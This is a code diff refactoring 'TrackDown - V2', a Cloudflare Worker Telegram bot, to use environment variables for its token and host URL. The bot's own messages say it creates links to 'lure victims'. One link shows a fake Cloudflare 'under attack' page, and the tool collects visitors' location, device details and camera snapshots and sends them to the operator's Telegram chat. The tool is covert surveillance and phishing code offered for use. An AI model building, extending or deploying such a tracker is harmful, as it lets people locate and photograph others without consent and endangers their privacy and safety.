@@ -1,8 +1,6 @@
 // Store sensitive values in environment variables instead of hardcoding
 // Replace these with your actual environment variables in your Cloudflare worker
-const TELEGRAM_BOT_TOKEN = TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
-const HOST_URL = HOST_URL || "https://your-worker-domain.workers.dev";
-const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
 
 /**
  * TrackDown - V2
@@ -89,7 +87,8 @@ function getClientIP(headers) {
 /**
  * Telegram API functions
  */
-async function sendTelegramMessage(chatId, text, options = {}) {
+async function sendTelegramMessage(env, chatId, text, options = {}) {
+  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
   try {
     const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
       method: 'POST',
@@ -116,7 +115,8 @@ async function sendTelegramMessage(chatId, text, options = {}) {
   }
 }
 
-async function sendTelegramLocation(chatId, lat, lon) {
+async function sendTelegramLocation(env, chatId, lat, lon) {
+  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
   try {
     // Validate coordinates
     const latitude = parseFloat(lat);
@@ -139,7 +139,8 @@ async function sendTelegramLocation(chatId, lat, lon) {
   }
 }
 
-async function sendTelegramPhoto(chatId, rawBase64Img, caption = "") {
+async function sendTelegramPhoto(env, chatId, rawBase64Img, caption = "") {
+  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
   try {
     if (typeof rawBase64Img !== 'string') {
       throw new Error("sendTelegramPhoto expects a raw base64 string.");
@@ -192,7 +193,8 @@ const corsHeaders = {
 /**
  * Webhook management functions
  */
-async function checkWebhookStatus() {
+async function checkWebhookStatus(env) {
+  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
   try {
     const response = await fetch(`${TELEGRAM_API}/getWebhookInfo`, {
       method: "GET",
@@ -207,7 +209,9 @@ async function checkWebhookStatus() {
   }
 }
 
-async function setupWebhook() {
+async function setupWebhook(env) {
+  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
+  const HOST_URL = env.HOST_URL || "https://your-worker-domain.workers.dev";
   try {
     const webhookUrl = `${HOST_URL}/webhook`;
     const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
@@ -227,12 +231,13 @@ async function setupWebhook() {
 /**
  * Bot functionality
  */
-async function createLink(chatId, url) {
+async function createLink(env, chatId, url) {
+  const HOST_URL = env.HOST_URL || "https://your-worker-domain.workers.dev";
   try {
     // Basic URL validation
     if (!url.match(/^https?:\/\/.+/i)) {
-      await sendTelegramMessage(chatId, `⚠️ Please enter a valid URL, including http:// or https://`);
-      await createNew(chatId);
+      await sendTelegramMessage(env, chatId, `⚠️ Please enter a valid URL, including http:// or https://`);
+      await createNew(env, chatId);
       return;
     }
     
@@ -240,8 +245,8 @@ async function createLink(chatId, url) {
     const hasEncodedChars = [...url].some(char => char.charCodeAt(0) > 127);
     
     if (hasEncodedChars) {
-      await sendTelegramMessage(chatId, `⚠️ URL contains special characters that may cause issues.`);
-      await createNew(chatId);
+      await sendTelegramMessage(env, chatId, `⚠️ URL contains special characters that may cause issues.`);
+      await createNew(env, chatId);
       return;
     }
     
@@ -252,34 +257,36 @@ async function createLink(chatId, url) {
     const wUrl = `${HOST_URL}/w/${uid}/${encodedUrl}`;
     
     // Send the links with inline keyboard
-    await sendTelegramMessage(chatId, `New links have been created successfully.\nURL: ${url}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, {
+    await sendTelegramMessage(env, chatId, `New links have been created successfully.\nURL: ${url}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, {
       reply_markup: JSON.stringify({
         "inline_keyboard": [[{text: "Create new Link", callback_data: "crenew"}]]
       })
     });
   } catch (error) {
     console.error("Error creating link:", error);
-    await sendTelegramMessage(chatId, `⚠️ An error occurred: ${error.message}`);
+    await sendTelegramMessage(env, chatId, `⚠️ An error occurred: ${error.message}`);
   }
 }
 
-async function createNew(chatId) {
+async function createNew(env, chatId) {
   try {
-    await sendTelegramMessage(chatId, `🌐 Enter Your URL`, {
+    await sendTelegramMessage(env, chatId, `🌐 Enter Your URL`, {
       reply_markup: JSON.stringify({
         "force_reply": true
       })
     });
   } catch (error) {
     console.error("Error in createNew:", error);
-    await sendTelegramMessage(chatId, `⚠️ An error occurred: ${error.message}`);
+    await sendTelegramMessage(env, chatId, `⚠️ An error occurred: ${error.message}`);
   }
 }
 
 /**
  * Main request handler
  */
-async function handleRequest(request) {
+async function handleRequest(request, env) {
+  const HOST_URL = env.HOST_URL || "https://your-worker-domain.workers.dev";
+  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
   // Handle preflight requests
   if (request.method === "OPTIONS") {
     return new Response(null, {
@@ -295,10 +302,10 @@ async function handleRequest(request) {
     if (path === "/setup-webhook" && request.method === "GET") {
       try {
         // Check current webhook status
-        const webhookInfo = await checkWebhookStatus();
+        const webhookInfo = await checkWebhookStatus(env);
         
         // Set up webhook
-        const setupResult = await setupWebhook();
+        const setupResult = await setupWebhook(env);
         
         // Check if the request wants JSON or HTML
         const acceptHeader = request.headers.get("accept") || "";
@@ -352,24 +359,24 @@ async function handleRequest(request) {
             
             if (command === '/start') {
               const firstName = update.message.chat.first_name || 'User';
-              await sendTelegramMessage(chatId, `Welcome ${firstName}! You can use this bot to track down people just through a simple link.\nIt can gather information like location, device info, camera snaps.\n\nType /help for more info or /create to generate a tracking link.`, {
+              await sendTelegramMessage(env, chatId, `Welcome ${firstName}! You can use this bot to track down people just through a simple link.\nIt can gather information like location, device info, camera snaps.\n\nType /help for more info or /create to generate a tracking link.`, {
                 reply_markup: JSON.stringify({
                   "inline_keyboard": [[{text: "Create Link", callback_data: "crenew"}]]
                 })
               });
             } else if (command === '/help') {
-              await sendTelegramMessage(chatId, `Through this bot you can track people just by sending a simple link.\n\nSend /create to begin, afterwards it will ask you for a URL which will be used to lure victims.\nAfter receiving the url it will send you 2 links which you can use to track people.\n\nSpecifications:\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather information and afterwards victim will be redirected to the destination URL.\n2. Webview Link: This will show a website using a different approach for gathering information.`);
+              await sendTelegramMessage(env, chatId, `Through this bot you can track people just by sending a simple link.\n\nSend /create to begin, afterwards it will ask you for a URL which will be used to lure victims.\nAfter receiving the url it will send you 2 links which you can use to track people.\n\nSpecifications:\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather information and afterwards victim will be redirected to the destination URL.\n2. Webview Link: This will show a website using a different approach for gathering information.`);
             } else if (command === '/create') {
-              await createNew(chatId);
+              await createNew(env, chatId);
             } else {
-              await sendTelegramMessage(chatId, "❓ Unknown command. Use /help to see available commands.");
+              await sendTelegramMessage(env, chatId, "❓ Unknown command. Use /help to see available commands.");
             }
           } else if (update.message.reply_to_message && update.message.reply_to_message.text === '🌐 Enter Your URL') {
             // Handle URL submission
-            await createLink(chatId, text);
+            await createLink(env, chatId, text);
           } else {
             // Handle regular messages
-            await sendTelegramMessage(chatId, "📝 You said: " + text + "\n\nUse /help to see available commands.");
+            await sendTelegramMessage(env, chatId, "📝 You said: " + text + "\n\nUse /help to see available commands.");
           }
         } else if (update.callback_query) {
           // Handle callback queries (button clicks)
@@ -387,7 +394,7 @@ async function handleRequest(request) {
           });
           
           if (data === 'crenew') {
-            await createNew(chatId);
+            await createNew(env, chatId);
           }
         }
         
@@ -537,23 +544,23 @@ async function handleRequest(request) {
           }
           
           // Send the main formatted message
-          await sendTelegramMessage(chatId, message);
+          await sendTelegramMessage(env, chatId, message);
 
           // Check for and send location data separately
           if (jsonData.data?.geolocation && !jsonData.data.geolocation.error) {
             const geo = jsonData.data.geolocation;
             try {
               // Send the interactive map pin
-              await sendTelegramLocation(chatId, geo.latitude, geo.longitude);
+              await sendTelegramLocation(env, chatId, geo.latitude, geo.longitude);
               // Send accuracy as a separate message
-              await sendTelegramMessage(chatId, `Latitude: ${geo.latitude}\nLongitude: ${geo.longitude}\nAccuracy: ${geo.accuracy} meters`);
+              await sendTelegramMessage(env, chatId, `Latitude: ${geo.latitude}\nLongitude: ${geo.longitude}\nAccuracy: ${geo.accuracy} meters`);
             } catch (locationError) {
               console.error("Error sending location:", locationError);
-              await sendTelegramMessage(chatId, `📍 Location Error: Could not send map pin. Coordinates: ${geo.latitude}, ${geo.longitude}`);
+              await sendTelegramMessage(env, chatId, `📍 Location Error: Could not send map pin. Coordinates: ${geo.latitude}, ${geo.longitude}`);
             }
           } else if (jsonData.data?.geolocation?.error) {
             // Notify if location failed
-            await sendTelegramMessage(chatId, `📍 Location Error: ${jsonData.data.geolocation.error}`);
+            await sendTelegramMessage(env, chatId, `📍 Location Error: ${jsonData.data.geolocation.error}`);
           }
 
           return new Response("OK", { headers: corsHeaders });
@@ -571,7 +578,7 @@ async function handleRequest(request) {
           const chatId = parseInt(uid, 36) || 123456789; // Fallback to default chat ID
           
           // Send the data directly as it's already formatted
-          await sendTelegramMessage(chatId, data);
+          await sendTelegramMessage(env, chatId, data);
           return new Response("OK", { headers: corsHeaders });
         }
       } catch (error) {
@@ -608,7 +615,7 @@ async function handleRequest(request) {
         const chatId = parseInt(uid, 36) || 123456789; // Fallback to default chat ID
 
         // Send the raw base64 image to Telegram
-        await sendTelegramPhoto(chatId, rawBase64, "📸 Camera snapshot from visitor");
+        await sendTelegramPhoto(env, chatId, rawBase64, "📸 Camera snapshot from visitor");
 
         return new Response("OK", { headers: corsHeaders });
       } catch (error) {
@@ -726,7 +733,8 @@ async function handleRequest(request) {
   }
 }
 
-// Add event listener for fetch events
-addEventListener("fetch", event => {
-  event.respondWith(handleRequest(event.request));
-});
+export default {
+  async fetch(request, env, ctx) {
+    return handleRequest(request, env);
+  }
+};
